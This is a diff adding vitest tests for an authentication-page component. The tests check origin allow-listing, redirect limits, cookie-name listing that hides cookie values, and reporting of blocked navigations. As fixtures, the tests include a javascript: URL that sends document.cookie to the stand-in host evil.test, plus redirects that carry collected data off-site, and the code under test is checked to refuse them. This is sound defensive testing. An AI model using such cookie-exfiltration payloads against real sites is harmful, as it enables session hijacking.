@@ -1,9 +1,11 @@
 import { inspect } from 'node:util'
-import { SecretValue, SiteAdapterError } from '@siteadapter/core'
+import { type BlockedRequest, SecretValue, SiteAdapterError } from '@siteadapter/core'
 import { describe, expect, it } from 'vitest'
 import { SurfaceAuthPage } from '../src/auth-page'
 import { needsUserTitle } from '../src/needs-user'
-import { FakeFrame, FakeSurface, flush, ManualTimers } from './fake-browser'
+import type { CookieRecord, SessionFetchRequest } from '../src/platform'
+import { MAX_PROBE_BYTES, MAX_PROBE_REDIRECTS } from '../src/session-fetch'
+import { FakeFrame, FakeSession, FakeSurface, flush, ManualTimers } from './fake-browser'
 import { FakeForm, FakeWindow } from './fake-dom'
 
 const NAVIGATION = ['https://www.example.com', 'https://login.example.com']
@@ -1239,5 +1241,328 @@ describe('AuthPage.handToUser leaves nothing behind', () => {
     surface.destroy()
     await handed
     expect(surface.closeHandler).toBe(later)
+  })
+})
+
+describe('AuthPage.fetch', () => {
+  const PROBE = 'https://www.example.com/api/ui/v2/bootstrap'
+  const json = (text: string, status = 200) => ({
+    ok: true as const,
+    status,
+    contentType: 'application/json',
+    body: new TextEncoder().encode(text),
+  })
+
+  function probePage(timers = new ManualTimers(), headers?: Record<string, string>) {
+    const surface = new FakeSurface(PARTITION)
+    const session = new FakeSession(PARTITION)
+    const page = new SurfaceAuthPage(surface, NAVIGATION, timing(timers), {
+      session,
+      ...(headers === undefined ? {} : { fetchHeaders: headers }),
+    })
+    return { surface, session, page, timers }
+  }
+
+  it('GETs through the partition’s session, not the page, and parses the JSON answer', async () => {
+    const { surface, session, page } = probePage()
+    session.onFetch = () => json('{"isLoggedIn":true}')
+    expect(await page.fetch(PROBE)).toEqual({
+      status: 200,
+      contentType: 'application/json',
+      body: { isLoggedIn: true },
+    })
+    expect(session.fetches.map((f) => f.url)).toEqual([PROBE])
+    expect(session.fetches[0]?.maxBytes).toBe(MAX_PROBE_BYTES)
+    // No script ran and nothing loaded in the page.
+    expect(surface.loads).toEqual([])
+    expect(surface.frameList[0]?.scripts).toEqual([])
+  })
+
+  it('restates the page’s UA and language, and always sends its own Accept', async () => {
+    const { session, page } = probePage(new ManualTimers(), {
+      'user-agent': 'Mozilla/5.0 clean',
+      'accept-language': 'en-AU,en;q=0.9',
+      accept: 'text/html',
+    })
+    await page.fetch(PROBE)
+    expect(session.fetches[0]?.headers).toEqual({
+      'user-agent': 'Mozilla/5.0 clean',
+      'accept-language': 'en-AU,en;q=0.9',
+      accept: '*/*',
+    })
+  })
+
+  it('refuses a URL off the navigation origins before anything is sent', async () => {
+    const { session, page } = probePage()
+    for (const url of [
+      'https://evil.test/api',
+      'https://www.example.com.evil.test/api',
+      'http://www.example.com/api',
+      '/api/ui/v2/bootstrap',
+    ]) {
+      expect(await rejection(page.fetch(url)), url).toMatchObject({
+        stage: 'probe',
+        errorClass: 'host-not-allowed',
+      })
+    }
+    expect(await rejection(page.fetch('https://u:p@www.example.com/api'))).toMatchObject({
+      stage: 'probe',
+      errorClass: 'invalid',
+    })
+    expect(session.fetches).toEqual([])
+  })
+
+  it('refuses a redirect off the navigation origins rather than following it', async () => {
+    const { session, page } = probePage()
+    const offered: boolean[] = []
+    session.onFetch = (request) => {
+      offered.push(request.allowRedirect('https://login.example.com/authorize'))
+      const allowed = request.allowRedirect('https://evil.test/collect?c=1')
+      offered.push(allowed)
+      return allowed ? json('{}') : { ok: false, failure: 'redirect-refused' }
+    }
+    expect(await rejection(page.fetch(PROBE))).toMatchObject({
+      stage: 'probe',
+      errorClass: 'host-not-allowed',
+    })
+    expect(offered).toEqual([true, false])
+  })
+
+  it('refuses a redirect that downgrades to http on a navigation host', async () => {
+    const { session, page } = probePage()
+    const offered: boolean[] = []
+    session.onFetch = (request) => {
+      offered.push(request.allowRedirect('http://www.example.com/api'))
+      return { ok: false, failure: 'redirect-refused' }
+    }
+    expect(await rejection(page.fetch(PROBE))).toMatchObject({ errorClass: 'host-not-allowed' })
+    expect(offered).toEqual([false])
+  })
+
+  it('gives up on a redirect loop on the list as unavailable', async () => {
+    const { session, page } = probePage()
+    session.onFetch = (request) => {
+      for (let hop = 0; hop <= MAX_PROBE_REDIRECTS; hop++) {
+        if (!request.allowRedirect(PROBE)) return { ok: false, failure: 'redirect-refused' }
+      }
+      return json('{}')
+    }
+    expect(await rejection(page.fetch(PROBE))).toMatchObject({ stage: 'probe', errorClass: 'unavailable' })
+  })
+
+  it('counts redirects per fetch, not per page', async () => {
+    const { session, page } = probePage()
+    session.onFetch = (request) => {
+      for (let hop = 0; hop < MAX_PROBE_REDIRECTS; hop++) {
+        if (!request.allowRedirect(PROBE)) return { ok: false, failure: 'redirect-refused' }
+      }
+      return json('{}')
+    }
+    await page.fetch(PROBE)
+    await expect(page.fetch(PROBE)).resolves.toMatchObject({ status: 200 })
+  })
+
+  it('reports a body over the cap as unexpected-shape, and a network failure as unavailable', async () => {
+    const { session, page } = probePage()
+    session.onFetch = () => ({ ok: false, failure: 'too-large' })
+    expect(await rejection(page.fetch(PROBE))).toMatchObject({
+      stage: 'probe',
+      errorClass: 'unexpected-shape',
+    })
+    session.onFetch = () => ({ ok: false, failure: 'network' })
+    expect(await rejection(page.fetch(PROBE))).toMatchObject({ stage: 'probe', errorClass: 'unavailable' })
+  })
+
+  it('hands back error statuses and HTML as they are, for the interpreter to classify', async () => {
+    const { session, page } = probePage()
+    session.onFetch = () => ({
+      ok: true,
+      status: 403,
+      contentType: 'text/html',
+      body: new TextEncoder().encode('<html>Access Denied Reference #18</html>'),
+    })
+    expect(await page.fetch(PROBE)).toEqual({
+      status: 403,
+      contentType: 'text/html',
+      body: '<html>Access Denied Reference #18</html>',
+    })
+  })
+
+  it('times out under the step timeout and aborts the request', async () => {
+    const { session, page, timers } = probePage()
+    const signals: AbortSignal[] = []
+    session.onFetch = (request) => {
+      signals.push(request.signal)
+      return new Promise(() => {})
+    }
+    const error = await timers.settle(rejection(page.fetch(PROBE)))
+    expect(error).toMatchObject({ stage: 'timeout', errorClass: 'timed-out' })
+    expect(timers.now).toBe(1000)
+    expect(signals.map((signal) => signal.aborted)).toEqual([true])
+  })
+
+  it('turns a throw from the platform into probe/internal without its message', async () => {
+    const { session, page } = probePage()
+    session.onFetch = () => {
+      throw new Error('net::ERR_CERT with cookie sid=hunter2')
+    }
+    const error = await rejection(page.fetch(PROBE))
+    expect(error).toMatchObject({ stage: 'probe', errorClass: 'internal' })
+    expect(error.message).not.toContain('hunter2')
+  })
+
+  it('fails like every other primitive once the page is poisoned, sending nothing', async () => {
+    const { surface, session, page } = probePage()
+    expect(surface.attemptNavigation('https://evil.test/', true)).toBe(false)
+    expect(await rejection(page.fetch(PROBE))).toMatchObject({
+      stage: 'navigate',
+      errorClass: 'navigation-escaped',
+    })
+    expect(await rejection(page.cookieNames(['www.example.com']))).toMatchObject({
+      errorClass: 'navigation-escaped',
+    })
+    expect(session.fetches).toEqual([])
+  })
+
+  it('fails as aborted once the window is gone', async () => {
+    const { surface, session, page } = probePage()
+    surface.destroy()
+    expect(await rejection(page.fetch(PROBE))).toMatchObject({ stage: 'probe', errorClass: 'aborted' })
+    expect(session.fetches).toEqual([])
+  })
+
+  it('is unsupported without a session', async () => {
+    const page = new SurfaceAuthPage(new FakeSurface(PARTITION), NAVIGATION, timing(new ManualTimers()))
+    expect(await rejection(page.fetch(PROBE))).toMatchObject({ stage: 'probe', errorClass: 'unsupported' })
+    expect(await rejection(page.cookieNames(['www.example.com']))).toMatchObject({
+      stage: 'probe',
+      errorClass: 'unsupported',
+    })
+  })
+
+  it('checks the URL before the session, so an off-list URL never reaches it', async () => {
+    const { session, page } = probePage()
+    const seen: SessionFetchRequest[] = []
+    session.onFetch = (request) => {
+      seen.push(request)
+      return json('{}')
+    }
+    await rejection(page.fetch('https://evil.test/'))
+    expect(seen).toEqual([])
+  })
+})
+
+describe('AuthPage.cookieNames', () => {
+  const cookie = (name: string, domain: string, value = 'secret-value'): CookieRecord => ({
+    name,
+    value,
+    domain,
+    path: '/',
+    sameSite: 'lax',
+  })
+
+  function namesPage(session: FakeSession) {
+    return new SurfaceAuthPage(new FakeSurface(PARTITION), NAVIGATION, timing(new ManualTimers()), {
+      session,
+    })
+  }
+
+  it('lists names, never values, of the auth partition’s cookies on the domains, once each', async () => {
+    const session = new FakeSession(PARTITION)
+    session.cookies = [
+      cookie('sid', 'www.example.com', 'hunter2'),
+      cookie('shared', '.example.com'),
+      cookie('sid', '.www.example.com', 'hunter3'),
+      cookie('auth0', 'login.example.com'),
+      cookie('other', 'evil.test'),
+      cookie('nodomain', ''),
+    ]
+    const page = namesPage(session)
+    const names = await page.cookieNames(['www.example.com', 'example.com'])
+    expect(names).toEqual(['sid', 'shared'])
+    expect(JSON.stringify(names)).not.toContain('hunter')
+    expect(await page.cookieNames([])).toEqual([])
+  })
+
+  it('refuses domains that are not a list of strings', async () => {
+    const page = namesPage(new FakeSession(PARTITION))
+    for (const domains of ['www.example.com', [1], null]) {
+      expect(await rejection(page.cookieNames(domains as unknown as string[]))).toMatchObject({
+        stage: 'probe',
+        errorClass: 'invalid',
+      })
+    }
+  })
+
+  it('turns a cookie-store failure into probe/internal', async () => {
+    const session = new FakeSession(PARTITION)
+    session.getCookies = async () => {
+      throw new Error('store locked: sid=hunter2')
+    }
+    const error = await rejection(namesPage(session).cookieNames(['www.example.com']))
+    expect(error).toMatchObject({ stage: 'probe', errorClass: 'internal' })
+    expect(error.message).not.toContain('hunter2')
+  })
+})
+
+describe('AuthPage block reports', () => {
+  function reportingPage(onBlocked: (blocked: BlockedRequest) => void) {
+    const surface = new FakeSurface(PARTITION)
+    const page = new SurfaceAuthPage(surface, NAVIGATION, timing(new ManualTimers()), {
+      frameOrigins: ['https://captcha.test'],
+      onBlocked,
+    })
+    return { surface, page }
+  }
+
+  it('reports a main-frame escape and an undeclared subframe as the page’s, with the origin only', () => {
+    const blocked: BlockedRequest[] = []
+    const { surface } = reportingPage((b) => blocked.push(b))
+    surface.attemptNavigation('https://widget.test/frame?token=abc', false)
+    surface.attemptNavigation('https://evil.test/landing?c=sid%3Dhunter2', true)
+    expect(blocked).toEqual([
+      { method: 'GET', target: 'https://widget.test', reason: 'host-not-allowed', initiator: 'page' },
+      { method: 'GET', target: 'https://evil.test', reason: 'host-not-allowed', initiator: 'page' },
+    ])
+  })
+
+  it('reports nothing for navigations it allows', () => {
+    const blocked: BlockedRequest[] = []
+    const { surface } = reportingPage((b) => blocked.push(b))
+    surface.attemptNavigation('https://login.example.com/authorize', true)
+    surface.attemptNavigation('https://captcha.test/frame', false)
+    surface.attemptNavigation('about:blank', false)
+    expect(blocked).toEqual([])
+  })
+
+  it('reports a URL with no network origin as bad-url without echoing it', () => {
+    const blocked: BlockedRequest[] = []
+    const { surface } = reportingPage((b) => blocked.push(b))
+    surface.attemptNavigation('javascript:fetch("https://evil.test/?"+document.cookie)', false)
+    surface.attemptNavigation('data:text/html,<p>sid=hunter2</p>', true)
+    surface.attemptNavigation('not a url', true)
+    expect(blocked).toEqual([
+      { method: 'GET', target: 'javascript:', reason: 'bad-url', initiator: 'page' },
+      { method: 'GET', target: 'data:', reason: 'bad-url', initiator: 'page' },
+      { method: 'GET', target: 'invalid-url', reason: 'bad-url', initiator: 'page' },
+    ])
+  })
+
+  it('reports an off-list commit that slipped past the guard', () => {
+    const blocked: BlockedRequest[] = []
+    const { surface } = reportingPage((b) => blocked.push(b))
+    surface.commit('https://evil.test/landed?x=1')
+    expect(blocked).toEqual([
+      { method: 'GET', target: 'https://evil.test', reason: 'host-not-allowed', initiator: 'page' },
+    ])
+  })
+
+  it('still refuses, and still poisons, when the reporter throws', async () => {
+    const { surface, page } = reportingPage(() => {
+      throw new Error('audit log full')
+    })
+    expect(surface.attemptNavigation('https://widget.test/', false)).toBe(false)
+    expect(surface.attemptNavigation('https://evil.test/', true)).toBe(false)
+    expect(await rejection(page.textPresent('x'))).toMatchObject({ errorClass: 'navigation-escaped' })
   })
 })
